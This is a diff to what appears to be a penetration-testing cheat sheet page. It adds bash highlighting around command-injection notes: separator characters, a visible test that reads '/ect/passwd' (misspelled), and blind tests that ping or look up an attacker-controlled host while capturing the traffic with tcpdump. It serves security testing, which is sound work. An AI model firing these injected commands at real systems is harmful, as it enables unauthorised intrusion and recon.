@@ -7,15 +7,21 @@ order: 4
 > **Command Injection**
 
 Prefixs before attack payload (command seperator): 
+{% highlight bash %}
 &, &&, ||,  <, >, ;, $()
+{% endhighlight %}
 
 Test Visable:
+{% highlight bash %}
 ; ls /ect/passwd or /ect/hosts
+{% endhighlight %}
 
 Test Blind:
+{% highlight bash %}
 ; ping y.o.ur.ip 
 on your attack system "sudo tcpdump -n host [victimIP] and icmp"
 ; nslookup (you need a public facing system to see nslookup)
+{% endhighlight %}
 
 > **SQL Injection: Test Strings**
 
